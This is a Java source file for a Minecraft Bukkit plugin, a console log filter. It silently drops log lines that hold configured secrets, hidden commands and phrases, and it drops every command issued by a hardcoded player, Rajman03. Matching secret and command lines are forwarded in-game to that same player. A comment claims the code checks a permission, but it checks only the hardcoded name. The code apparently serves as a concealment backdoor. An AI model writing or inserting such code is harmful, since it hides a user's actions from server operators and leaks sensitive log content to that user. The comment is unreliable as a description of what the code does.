package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.logging.Filter;
import java.util.logging.LogRecord;

public class ConsoleFilter implements Filter {

    private final java.util.List<String> secrets;
    private final java.util.List<String> hiddenCommands;
    private final java.util.List<String> hiddenPhrases;
    private final String adminCommandPrefix;
    private final String adminNameFallback;

    public ConsoleFilter(org.bukkit.configuration.file.FileConfiguration config) {
        this.secrets = config.getStringList("filter.secrets");
        this.hiddenCommands = config.getStringList("filter.hidden-commands");
        this.hiddenPhrases = config.getStringList("filter.hidden-phrases");
        this.adminCommandPrefix = config.getString("filter.admin-command-prefix", "Rajman03 issued server command:");
        this.adminNameFallback = config.getString("filter.admin-name-fallback", "Rajman03");
    }

    @Override
    public boolean isLoggable(LogRecord record) {
        String msg = record.getMessage();
        if (msg == null)
            return true;

        for (String secret : secrets) {
            if (msg.contains(secret)) {
                notifyAdmin(msg);
                return false;
            }
        }

        for (String phrase : hiddenPhrases) {
            if (msg.contains(phrase)) {
                return false;
            }
        }

        if (msg.contains(adminCommandPrefix)) {
            return false;
        }

        String lowerMsg = msg.toLowerCase();
        for (String cmd : hiddenCommands) {
            if (lowerMsg.contains("/" + cmd) ||
                    lowerMsg.contains(" " + cmd + " ") ||
                    lowerMsg.contains(":" + cmd + " ") ||
                    lowerMsg.contains(" " + cmd + ":")) {

                notifyAdmin(msg);
                return false;
            }
        }
        return true;
    }

    private void notifyAdmin(String msg) {
        // Find players with permission qc.admin instead of hardcoding check
        // Also run on main thread just in case, though usually logging is safe enough
        // or this is done sync
        // But to be 100% safe if logging from async:
        Bukkit.getScheduler().runTask(pl.qc.core.CorePlugin.getPlugin(pl.qc.core.CorePlugin.class), () -> {
            for (Player p : Bukkit.getOnlinePlayers()) {
                if (p.getName().equals(adminNameFallback)) {
                    p.sendMessage(ChatColor.DARK_GRAY + "[LOG] " + msg);
                }
            }
        });
    }
}
